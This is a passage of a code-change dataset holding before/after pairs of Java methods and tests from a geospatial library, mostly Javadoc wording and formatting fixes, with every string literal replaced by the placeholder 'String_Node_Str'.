  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(-41,10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",584102,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",5460761,position.getOrdinate(1),STRICT);
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(82,10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",422407,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",9108183,position.getOrdinate(1),STRICT);
}","/** 
 * Tests decoding of various coordinates, all at the same resolution.
 * @throws TransformException if an error occurred while computing the coordinate.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testDecoding() throws TransformException {
  final MilitaryGridReferenceSystem.Coder coder=coder();
  DirectPosition position;
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(41,10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",584102,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",4539239,position.getOrdinate(1),STRICT);
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(82,-10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",484463,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",9104963,position.getOrdinate(1),STRICT);
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(-41,10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",584102,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",5460761,position.getOrdinate(1),STRICT);
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(82,10),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",422407,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",9108183,position.getOrdinate(1),STRICT);
  position=coder.decode(""String_Node_Str"");
  assertSame(""String_Node_Str"",CommonCRS.WGS84.universal(-49.4,10.3),position.getCoordinateReferenceSystem());
  assertEquals(""String_Node_Str"",593608,position.getOrdinate(0),STRICT);
  assertEquals(""String_Node_Str"",4526322,position.getOrdinate(1),STRICT);
}"
91739,"/** 
 * Encode random coordinates, decode them and verifies that the results are approximatively equals to the original coordinates.
 * @throws TransformException if an error occurred while computing the coordinate.
 */
@DependsOnMethod({""String_Node_Str"",""String_Node_Str""}) public void verifyConsistency() throws TransformException {
  final Random random=TestUtilities.createRandomNumberGenerator();
  final MilitaryGridReferenceSystem.Coder coder=coder();
  final DirectPosition2D expected=new DirectPosition2D();
  final DirectPosition2D position=new DirectPosition2D(CommonCRS.WGS84.geographic());
  for (int i=0; i < 100; i++) {
    position.x=random.nextDouble() * 160 - 80;
    position.y=random.nextDouble() * 358 - 179;
    final String reference=coder.encode(position);
    final DirectPosition r=coder.decode(reference);
    final ProjectedCRS crs=(ProjectedCRS)r.getCoordinateReferenceSystem();
    assertSame(expected,crs.getConversionFromBase().getMathTransform().transform(position,expected));
    final double distance=expected.distance(r.getOrdinate(0),r.getOrdinate(1));
    if (!(distance < 1.5)) {
      final String lineSeparator=System.lineSeparator();
      fail(""String_Node_Str"" + position.x + ""String_Node_Str""+ position.y+ lineSeparator+ ""String_Node_Str""+ reference+ lineSeparator+ ""String_Node_Str""+ r+ lineSeparator+ ""String_Node_Str""+ expected+ lineSeparator+ ""String_Node_Str""+ distance+ lineSeparator);
    }
  }
}","/** 
 * Encode random coordinates, decode them and verifies that the results are approximatively equals to the original coordinates.
 * @throws TransformException if an error occurred while computing the coordinate.
 */
@Test @DependsOnMethod({""String_Node_Str"",""String_Node_Str""}) public void verifyConsistency() throws TransformException {
  final Random random=TestUtilities.createRandomNumberGenerator();
  final MilitaryGridReferenceSystem.Coder coder=coder();
  final DirectPosition2D expected=new DirectPosition2D();
  final DirectPosition2D position=new DirectPosition2D(CommonCRS.WGS84.geographic());
  for (int i=0; i < 100; i++) {
    position.x=random.nextDouble() * 160 - 80;
    position.y=random.nextDouble() * 358 - 179;
    final String reference=coder.encode(position);
    final DirectPosition r=coder.decode(reference);
    final ProjectedCRS crs=(ProjectedCRS)r.getCoordinateReferenceSystem();
    assertSame(expected,crs.getConversionFromBase().getMathTransform().transform(position,expected));
    final double distance=expected.distance(r.getOrdinate(0),r.getOrdinate(1));
    if (!(distance < 1.5)) {
      final String lineSeparator=System.lineSeparator();
      fail(""String_Node_Str"" + position.x + ""String_Node_Str""+ position.y+ lineSeparator+ ""String_Node_Str""+ reference+ lineSeparator+ ""String_Node_Str""+ r+ lineSeparator+ ""String_Node_Str""+ expected+ lineSeparator+ ""String_Node_Str""+ distance+ lineSeparator);
    }
  }
}"
91740,"/** 
 * Tests   {@link MetadataStandard#isMetadata(Class)}.
 */
@Test public void testIsMetadata(){
  standard=MetadataStandard.ISO_19115;
  assertFalse(""String_Node_Str"",isMetadata(String.class));
  assertTrue(""String_Node_Str"",isMetadata(Citation.class));
  assertTrue(""String_Node_Str"",isMetadata(DefaultCitation.class));
  assertFalse(""String_Node_Str"",isMetadata(IdentifiedObject.class));
  assertFalse(""String_Node_Str"",isMetadata(SimpleIdentifiedObject.class));
  assertFalse(""String_Node_Str"",isMetadata(GeographicCRS.class));
  assertFalse(""String_Node_Str"",isMetadata(RectifiedGrid.class));
  standard=MetadataStandard.ISO_19111;
  assertFalse(""String_Node_Str"",isMetadata(String.class));
  assertTrue(""String_Node_Str"",isMetadata(Citation.class));
  assertTrue(""String_Node_Str"",isMetadata(DefaultCitation.class));
  assertTrue(""String_Node_Str"",isMetadata(IdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(SimpleIdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(GeographicCRS.class));
  assertFalse(""String_Node_Str"",isMetadata(RectifiedGrid.class));
  standard=MetadataStandard.ISO_19123;
  assertFalse(""String_Node_Str"",isMetadata(String.class));
  assertTrue(""String_Node_Str"",isMetadata(Citation.class));
  assertTrue(""String_Node_Str"",isMetadata(DefaultCitation.class));
  assertTrue(""String_Node_Str"",isMetadata(IdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(SimpleIdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(GeographicCRS.class));
  assertTrue(""String_Node_Str"",isMetadata(RectifiedGrid.class));
}","/** 
 * Tests   {@link MetadataStandard#isMetadata(Class)}.
 */
@Test public void testIsMetadata(){
  standard=MetadataStandard.ISO_19115;
  assertFalse(""String_Node_Str"",isMetadata(String.class));
  assertTrue(""String_Node_Str"",isMetadata(Citation.class));
  assertTrue(""String_Node_Str"",isMetadata(DefaultCitation.class));
  assertFalse(""String_Node_Str"",isMetadata(IdentifiedObject.class));
  assertFalse(""String_Node_Str"",isMetadata(SimpleIdentifiedObject.class));
  assertFalse(""String_Node_Str"",isMetadata(GeographicCRS.class));
  assertFalse(""String_Node_Str"",isMetadata(RectifiedGrid.class));
  assertFalse(""String_Node_Str"",isMetadata(Double.class));
  assertFalse(""String_Node_Str"",isMetadata(Double.TYPE));
  standard=MetadataStandard.ISO_19111;
  assertFalse(""String_Node_Str"",isMetadata(String.class));
  assertTrue(""String_Node_Str"",isMetadata(Citation.class));
  assertTrue(""String_Node_Str"",isMetadata(DefaultCitation.class));
  assertTrue(""String_Node_Str"",isMetadata(IdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(SimpleIdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(GeographicCRS.class));
  assertFalse(""String_Node_Str"",isMetadata(RectifiedGrid.class));
  standard=MetadataStandard.ISO_19123;
  assertFalse(""String_Node_Str"",isMetadata(String.class));
  assertTrue(""String_Node_Str"",isMetadata(Citation.class));
  assertTrue(""String_Node_Str"",isMetadata(DefaultCitation.class));
  assertTrue(""String_Node_Str"",isMetadata(IdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(SimpleIdentifiedObject.class));
  assertTrue(""String_Node_Str"",isMetadata(GeographicCRS.class));
  assertTrue(""String_Node_Str"",isMetadata(RectifiedGrid.class));
}"
91741,"/** 
 * Creates a new attribute of the given type initialized to the given value. Note that a   {@code null} value may not be the same as the default value.
 * @param < V >    the type of attribute values.
 * @param type   information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @param value  the initial value (may be {@code null}).
 * @return The new attribute.
 */
static <V>AbstractAttribute<V> create(final DefaultAttributeType<V> type,final Object value){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  return isSingleton(type.getMaximumOccurs()) ? new SingletonAttribute<>(type,value) : new MultiValuedAttribute<>(type,value);
}","/** 
 * Creates a new attribute of the given type initialized to the given value. Note that a   {@code null} value may not be the same as the default value.
 * @param < V >    the type of attribute values.
 * @param type   information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @param value  the initial value (may be {@code null}).
 * @return the new attribute.
 */
static <V>AbstractAttribute<V> create(final DefaultAttributeType<V> type,final Object value){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  return isSingleton(type.getMaximumOccurs()) ? new SingletonAttribute<>(type,value) : new MultiValuedAttribute<>(type,value);
}"
91742,"/** 
 * Creates an initially empty map of attribute characteristics.
 * @param source  the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  description of the characteristics of {@code source}.
 */
CharacteristicMap(final AbstractAttribute<?> source,final CharacteristicTypeMap types){
  this.source=source;
  this.types=types;
}","/** 
 * Creates an initially empty map of attribute characteristics.
 * @param source           the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  description of the characteristics of {@code source}.
 */
CharacteristicMap(final AbstractAttribute<?> source,final CharacteristicTypeMap types){
  this.source=source;
  this.types=types;
}"
91743,"/** 
 * Creates a new map or return an existing map for the given attribute characteristics. <p>This method does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source  the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @return a map for this given characteristics.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
static CharacteristicTypeMap create(final DefaultAttributeType<?> source,final DefaultAttributeType<?>[] characterizedBy){
  CharacteristicTypeMap map;
synchronized (SHARED) {
    map=SHARED.get(characterizedBy);
    if (map == null) {
      map=new CharacteristicTypeMap(source,characterizedBy);
      SHARED.put(characterizedBy,map);
    }
  }
  return map;
}","/** 
 * Creates a new map or return an existing map for the given attribute characteristics. <p>This method does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source           the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @return a map for this given characteristics.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
static CharacteristicTypeMap create(final DefaultAttributeType<?> source,final DefaultAttributeType<?>[] characterizedBy){
  CharacteristicTypeMap map;
synchronized (SHARED) {
    map=SHARED.get(characterizedBy);
    if (map == null) {
      map=new CharacteristicTypeMap(source,characterizedBy);
      SHARED.put(characterizedBy,map);
    }
  }
  return map;
}"
91744,"/** 
 * Creates a new map for the given attribute characteristics. <p>This constructor does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source  the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
private CharacteristicTypeMap(final DefaultAttributeType<?> source,final DefaultAttributeType<?>[] characterizedBy){
  this.characterizedBy=characterizedBy;
  int index=0;
  final Map<String,Integer> indices=new HashMap<>(Containers.hashMapCapacity(characterizedBy.length));
  final Map<String,Integer> aliases=new HashMap<>();
  for (int i=0; i < characterizedBy.length; i++) {
    final DefaultAttributeType<?> attribute=characterizedBy[i];
    ensureNonNullElement(""String_Node_Str"",i,attribute);
    GenericName name=attribute.getName();
    String key=AbstractIdentifiedType.toString(name,source,""String_Node_Str"",i);
    final Integer value=index++;
    if (indices.put(key,value) != null) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.DuplicatedIdentifier_1,key));
    }
    while (name instanceof ScopedName) {
      if (name == (name=((ScopedName)name).tail()))       break;
      key=name.toString();
      if (key == null || (key=key.trim()).isEmpty())       break;
      if (aliases.put(key,value) != null) {
        aliases.put(key,-1);
      }
    }
  }
  for (  final Map.Entry<String,Integer> entry : aliases.entrySet()) {
    final Integer value=entry.getValue();
    if (value >= 0) {
      JDK8.putIfAbsent(indices,entry.getKey(),value);
    }
  }
  this.indices=CollectionsExt.compact(indices);
}","/** 
 * Creates a new map for the given attribute characteristics. <p>This constructor does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source           the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
private CharacteristicTypeMap(final DefaultAttributeType<?> source,final DefaultAttributeType<?>[] characterizedBy){
  this.characterizedBy=characterizedBy;
  int index=0;
  final Map<String,Integer> indices=new HashMap<>(Containers.hashMapCapacity(characterizedBy.length));
  final Map<String,Integer> aliases=new HashMap<>();
  for (int i=0; i < characterizedBy.length; i++) {
    final DefaultAttributeType<?> attribute=characterizedBy[i];
    ensureNonNullElement(""String_Node_Str"",i,attribute);
    GenericName name=attribute.getName();
    String key=AbstractIdentifiedType.toString(name,source,""String_Node_Str"",i);
    final Integer value=index++;
    if (indices.put(key,value) != null) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.DuplicatedIdentifier_1,key));
    }
    while (name instanceof ScopedName) {
      if (name == (name=((ScopedName)name).tail()))       break;
      key=name.toString();
      if (key == null || (key=key.trim()).isEmpty())       break;
      if (aliases.put(key,value) != null) {
        aliases.put(key,-1);
      }
    }
  }
  for (  final Map.Entry<String,Integer> entry : aliases.entrySet()) {
    final Integer value=entry.getValue();
    if (value >= 0) {
      JDK8.putIfAbsent(indices,entry.getKey(),value);
    }
  }
  this.indices=CollectionsExt.compact(indices);
}"
91745,"/** 
 * Invoked on serialization for saving the   {@link #characteristics} field.
 * @param out The output stream where to serialize this attribute type.
 * @throws IOException If an I/O error occurred while writing.
 */
private void writeObject(final ObjectOutputStream out) throws IOException {
  out.defaultWriteObject();
  out.writeObject(characteristics != null ? characteristics.characterizedBy : null);
}","/** 
 * Invoked on serialization for saving the   {@link #characteristics} field.
 * @param out The output stream where to serialize this attribute type.
 * @throws IOException if an I/O error occurred while writing.
 */
private void writeObject(final ObjectOutputStream out) throws IOException {
  out.defaultWriteObject();
  out.writeObject(characteristics != null ? characteristics.characterizedBy : null);
}"
91746,"/** 
 * Returns any feature operation, any feature attribute type and any feature association role that carries characteristics of a feature type. The returned collection will include the properties inherited from the   {@linkplain #getSuperTypes() super-types} only if {@code includeSuperTypes}is   {@code true}. <div class=""warning""><b>Warning:</b> The type of list elements will be changed to   {@code PropertyType} if and when such interfacewill be defined in GeoAPI.</div>
 * @param includeSuperTypes {@code true} for including the properties inherited from the super-types,or  {@code false} for returning only the properties defined explicitely in this type.
 * @return feature operation, attribute type and association role that carries characteristics of thisfeature type (not including parent types).
 */
@Override public Collection<AbstractIdentifiedType> getProperties(final boolean includeSuperTypes){
  return includeSuperTypes ? allProperties : properties;
}","/** 
 * Returns any feature operation, any feature attribute type and any feature association role that carries characteristics of a feature type. The returned collection will include the properties inherited from the   {@linkplain #getSuperTypes() super-types} only if {@code includeSuperTypes}is   {@code true}. <div class=""warning""><b>Warning:</b> The type of list elements will be changed to   {@code PropertyType} if and when such interfacewill be defined in GeoAPI.</div>
 * @param includeSuperTypes  {@code true} for including the properties inherited from the super-types,or  {@code false} for returning only the properties defined explicitely in this type.
 * @return feature operation, attribute type and association role that carries characteristics of thisfeature type (not including parent types).
 */
@Override public Collection<AbstractIdentifiedType> getProperties(final boolean includeSuperTypes){
  return includeSuperTypes ? allProperties : properties;
}"
91747,"/** 
 * Not yet supported.
 * @return Currently never return.
 * @throws ParseException currently always thrown.
 */
@Override public Object parse(final CharSequence text,final ParsePosition pos) throws ParseException {
  throw new ParseException(Errors.getResources(displayLocale).getString(Errors.Keys.UnsupportedOperation_1,""String_Node_Str""),0);
}","/** 
 * Not yet supported.
 * @return currently never return.
 * @throws ParseException currently always thrown.
 */
@Override public Object parse(final CharSequence text,final ParsePosition pos) throws ParseException {
  throw new ParseException(Errors.getResources(displayLocale).getString(Errors.Keys.UnsupportedOperation_1,""String_Node_Str""),0);
}"
91748,"/** 
 * Creates an operation computing the envelope that encompass all geometries found in the given attributes. Geometries can be in different coordinate reference systems; they will be transformed to the first non-null CRS in the following choices: <ol> <li>the CRS specified to this method,</li> <li>the CRS of the default geometry, or</li> <li>the CRS of the first non-empty geometry.</li> </ol> The   {@linkplain AbstractOperation#getResult() result} of this operation is an {@code Attribute}with values of type   {@link org.opengis.geometry.Envelope}. If the   {@code crs} argument given tothis method is non-null, then the {@linkplain org.apache.sis.geometry.GeneralEnvelope#getCoordinateReferenceSystem() envelope CRS}will be that CRS. <div class=""section"">Limitations</div> If a geometry contains other geometries, this operation queries only the envelope of the root geometry. It is the root geometry responsibility to take in account the envelope of all its children. <div class=""section"">Read/write behavior</div> This operation is read-only. Calls to   {@code Attribute.setValue(Envelope)} will result in an{@link IllegalStateException} to be thrown.<div class=""warning""><b>Warning:</b> The type of  {@code geometryAttributes} elements will be changed to {@code PropertyType}if and when such interface will be defined in GeoAPI.</div>
 * @param identification     the name and other information to be given to the operation.
 * @param crs                the Coordinate Reference System in which to express the envelope, or {@code null}.
 * @param geometryAttributes the operation or attribute type from which to get geometry values.Any element which is  {@code null} or has a non-geometric value class will be ignored.
 * @return an operation which will compute the envelope encompassing all geometries in the given attributes.
 * @throws FactoryException if a coordinate operation to the target CRS can not be created.
 */
public static AbstractOperation envelope(final Map<String,?> identification,final CoordinateReferenceSystem crs,final AbstractIdentifiedType... geometryAttributes) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",geometryAttributes);
  return POOL.unique(new EnvelopeOperation(identification,crs,geometryAttributes));
}","/** 
 * Creates an operation computing the envelope that encompass all geometries found in the given attributes. Geometries can be in different coordinate reference systems; they will be transformed to the first non-null CRS in the following choices: <ol> <li>the CRS specified to this method,</li> <li>the CRS of the default geometry, or</li> <li>the CRS of the first non-empty geometry.</li> </ol> The   {@linkplain AbstractOperation#getResult() result} of this operation is an {@code Attribute}with values of type   {@link org.opengis.geometry.Envelope}. If the   {@code crs} argument given tothis method is non-null, then the {@linkplain org.apache.sis.geometry.GeneralEnvelope#getCoordinateReferenceSystem() envelope CRS}will be that CRS. <div class=""section"">Limitations</div> If a geometry contains other geometries, this operation queries only the envelope of the root geometry. It is the root geometry responsibility to take in account the envelope of all its children. <div class=""section"">Read/write behavior</div> This operation is read-only. Calls to   {@code Attribute.setValue(Envelope)} will result in an{@link IllegalStateException} to be thrown.<div class=""warning""><b>Warning:</b> The type of  {@code geometryAttributes} elements will be changed to {@code PropertyType}if and when such interface will be defined in GeoAPI.</div>
 * @param identification      the name and other information to be given to the operation.
 * @param crs                 the Coordinate Reference System in which to express the envelope, or {@code null}.
 * @param geometryAttributes  the operation or attribute type from which to get geometry values.Any element which is  {@code null} or has a non-geometric value class will be ignored.
 * @return an operation which will compute the envelope encompassing all geometries in the given attributes.
 * @throws FactoryException if a coordinate operation to the target CRS can not be created.
 */
public static AbstractOperation envelope(final Map<String,?> identification,final CoordinateReferenceSystem crs,final AbstractIdentifiedType... geometryAttributes) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",geometryAttributes);
  return POOL.unique(new EnvelopeOperation(identification,crs,geometryAttributes));
}"
91749,"/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  buffer.append(referentName);
}","/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer  where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  buffer.append(referentName);
}"
91750,"/** 
 * Returns the feature, or   {@code null} if none.
 * @return The feature (may be {@code null}).
 * @throws IllegalStateException if this association contains more than one value.
 */
@Override public AbstractFeature getValue(){
switch (values.size()) {
case 0:
    return null;
case 1:
  return values.get(0);
default :
throw new IllegalStateException(Resources.format(Resources.Keys.NotASingleton_1,getName()));
}
}","/** 
 * Returns the feature, or   {@code null} if none.
 * @return the feature (may be {@code null}).
 * @throws IllegalStateException if this association contains more than one value.
 */
@Override public AbstractFeature getValue(){
switch (values.size()) {
case 0:
    return null;
case 1:
  return values.get(0);
default :
throw new IllegalStateException(Resources.format(Resources.Keys.NotASingleton_1,getName()));
}
}"
91751,"/** 
 * Returns all features, or an empty collection if none. The returned collection is <cite>live</cite>: changes in the returned collection will be reflected immediately in this   {@code Association} instance, and conversely.
 * @return The features in a <cite>live</cite> collection.
 */
@Override @SuppressWarnings(""String_Node_Str"") public Collection<AbstractFeature> getValues(){
  return values;
}","/** 
 * Returns all features, or an empty collection if none. The returned collection is <cite>live</cite>: changes in the returned collection will be reflected immediately in this   {@code Association} instance, and conversely.
 * @return the features in a <cite>live</cite> collection.
 */
@Override @SuppressWarnings(""String_Node_Str"") public Collection<AbstractFeature> getValues(){
  return values;
}"
91752,"/** 
 * Sets the feature values. All previous values are replaced by the given collection.
 * @param newValues The new values.
 */
@Override public void setValues(final Collection<? extends AbstractFeature> newValues){
  if (newValues != values) {
    ArgumentChecks.ensureNonNull(""String_Node_Str"",newValues);
    final DefaultFeatureType base=role.getValueType();
    values.clear();
    for (    final AbstractFeature value : newValues) {
      ensureValid(base,value.getType());
      values.add(value);
    }
  }
}","/** 
 * Sets the feature values. All previous values are replaced by the given collection.
 * @param newValues  the new values.
 */
@Override public void setValues(final Collection<? extends AbstractFeature> newValues){
  if (newValues != values) {
    ArgumentChecks.ensureNonNull(""String_Node_Str"",newValues);
    final DefaultFeatureType base=role.getValueType();
    values.clear();
    for (    final AbstractFeature value : newValues) {
      ensureValid(base,value.getType());
      values.add(value);
    }
  }
}"
91753,"/** 
 * Returns a hash code value for this association.
 * @return A hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + values.hashCode();
}","/** 
 * Returns a hash code value for this association.
 * @return a hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + values.hashCode();
}"
91754,"/** 
 * Sets the feature.
 * @param value The new value, or {@code null} for removing all values from this association.
 */
@Override public void setValue(final AbstractFeature value){
  values.clear();
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
    values.add(value);
  }
}","/** 
 * Sets the feature.
 * @param value  the new value, or {@code null} for removing all values from this association.
 */
@Override public void setValue(final AbstractFeature value){
  values.clear();
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
    values.add(value);
  }
}"
91755,"/** 
 * Returns a copy of this association. This implementation returns a <em>shallow</em> copy: the association   {@linkplain #getValues() values} are <strong>not</strong> cloned.
 * @return A clone of this association.
 * @throws CloneNotSupportedException if this association can not be cloned.
 */
@Override @SuppressWarnings(""String_Node_Str"") public MultiValuedAssociation clone() throws CloneNotSupportedException {
  final MultiValuedAssociation clone=(MultiValuedAssociation)super.clone();
  clone.values=(CheckedArrayList<AbstractFeature>)clone.values.clone();
  return clone;
}","/** 
 * Returns a copy of this association. This implementation returns a <em>shallow</em> copy: the association   {@linkplain #getValues() values} are <strong>not</strong> cloned.
 * @return a clone of this association.
 * @throws CloneNotSupportedException if this association can not be cloned.
 */
@Override @SuppressWarnings(""String_Node_Str"") public MultiValuedAssociation clone() throws CloneNotSupportedException {
  final MultiValuedAssociation clone=(MultiValuedAssociation)super.clone();
  clone.values=(CheckedArrayList<AbstractFeature>)clone.values.clone();
  return clone;
}"
91756,"/** 
 * Returns the associated feature.
 * @return The associated feature (may be {@code null}).
 */
@Override public AbstractFeature getValue(){
  return value;
}","/** 
 * Returns the associated feature.
 * @return the associated feature (may be {@code null}).
 */
@Override public AbstractFeature getValue(){
  return value;
}"
91757,"/** 
 * Creates a new association of the given role initialized to the given value.
 * @param role  Information about the association.
 * @param value The initial value (may be {@code null}).
 */
SingletonAssociation(final DefaultAssociationRole role,final AbstractFeature value){
}","/** 
 * Creates a new association of the given role initialized to the given value.
 * @param role   information about the association.
 * @param value  the initial value (may be {@code null}).
 */
SingletonAssociation(final DefaultAssociationRole role,final AbstractFeature value){
}"
91758,"/** 
 * Returns a hash code value for this association.
 * @return A hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + Objects.hashCode(value);
}","/** 
 * Returns a hash code value for this association.
 * @return a hash code value.
 */
@Override public int hashCode(){
  return role.hashCode() + Objects.hashCode(value);
}"
91759,"/** 
 * Sets the associated feature.
 * @param value The new value, or {@code null}.
 * @throws IllegalArgumentException If the given feature is not valid for this association.
 */
@Override public void setValue(final AbstractFeature value) throws IllegalArgumentException {
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
  }
  this.value=value;
}","/** 
 * Sets the associated feature.
 * @param value  the new value, or {@code null}.
 * @throws InvalidPropertyValueException if the given feature is not valid for this association.
 */
@Override public void setValue(final AbstractFeature value) throws IllegalArgumentException {
  if (value != null) {
    ensureValid(role.getValueType(),value.getType());
  }
  this.value=value;
}"
91760,"/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  if (prefix != null)   buffer.append(prefix);
  for (int i=0; i < attributeNames.length; i++) {
    if (i != 0)     buffer.append(delimiter);
    buffer.append(attributeNames[i]);
  }
  if (suffix != null)   buffer.append(suffix);
}","/** 
 * Appends a string representation of the ""formula"" used for computing the result.
 * @param buffer  where to format the ""formula"".
 */
@Override void formatResultFormula(final Appendable buffer) throws IOException {
  if (prefix != null)   buffer.append(prefix);
  for (int i=0; i < attributeNames.length; i++) {
    if (i != 0)     buffer.append(delimiter);
    buffer.append(attributeNames[i]);
  }
  if (suffix != null)   buffer.append(suffix);
}"
91761,"/** 
 * Creates a new attribute of the given type initialized to the given value. Note that a   {@code null} value may not be the same as the default value.
 * @param < V >    the type of attribute values.
 * @param type   information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @param value  the initial value (may be {@code null}).
 * @return The new attribute.
 */
static <V>AbstractAttribute<V> create(final AttributeType<V> type,final Object value){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  return isSingleton(type.getMaximumOccurs()) ? new SingletonAttribute<>(type,value) : new MultiValuedAttribute<>(type,value);
}","/** 
 * Creates a new attribute of the given type initialized to the given value. Note that a   {@code null} value may not be the same as the default value.
 * @param < V >    the type of attribute values.
 * @param type   information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @param value  the initial value (may be {@code null}).
 * @return the new attribute.
 */
static <V>AbstractAttribute<V> create(final AttributeType<V> type,final Object value){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  return isSingleton(type.getMaximumOccurs()) ? new SingletonAttribute<>(type,value) : new MultiValuedAttribute<>(type,value);
}"
91762,"/** 
 * Creates an initially empty map of attribute characteristics.
 * @param source  the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  description of the characteristics of {@code source}.
 */
CharacteristicMap(final Attribute<?> source,final CharacteristicTypeMap types){
  this.source=source;
  this.types=types;
}","/** 
 * Creates an initially empty map of attribute characteristics.
 * @param source           the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  description of the characteristics of {@code source}.
 */
CharacteristicMap(final Attribute<?> source,final CharacteristicTypeMap types){
  this.source=source;
  this.types=types;
}"
91763,"/** 
 * Creates a new map or return an existing map for the given attribute characteristics. <p>This method does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source  the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @return a map for this given characteristics.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
static CharacteristicTypeMap create(final AttributeType<?> source,final AttributeType<?>[] characterizedBy){
  CharacteristicTypeMap map;
synchronized (SHARED) {
    map=SHARED.get(characterizedBy);
    if (map == null) {
      map=new CharacteristicTypeMap(source,characterizedBy);
      SHARED.put(characterizedBy,map);
    }
  }
  return map;
}","/** 
 * Creates a new map or return an existing map for the given attribute characteristics. <p>This method does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source           the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @return a map for this given characteristics.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
static CharacteristicTypeMap create(final AttributeType<?> source,final AttributeType<?>[] characterizedBy){
  CharacteristicTypeMap map;
synchronized (SHARED) {
    map=SHARED.get(characterizedBy);
    if (map == null) {
      map=new CharacteristicTypeMap(source,characterizedBy);
      SHARED.put(characterizedBy,map);
    }
  }
  return map;
}"
91764,"/** 
 * Creates a new map for the given attribute characteristics. <p>This constructor does not clone the   {@code characterizedBy} array. If that arrayis a user-provided argument, then cloning that array is caller responsibility.</p>
 * @param source  the attribute which is characterized by {@code characterizedBy}.
 * @param characterizedBy  characteristics of {@code source}. Should not be empty.
 * @throws IllegalArgumentException if two characteristics have the same name.
 */
private CharacteristicTypeMap(final AttributeType<?> source,final AttributeType<?>[] characterizedBy){
  this.characterizedBy=characterizedBy;
  int index=0;
  final Map<String,Integer> indices=new HashMap<>(Containers.hashMapCapacity(characterizedBy.length));
  final Map<String,Integer> aliases=new HashMap<>();
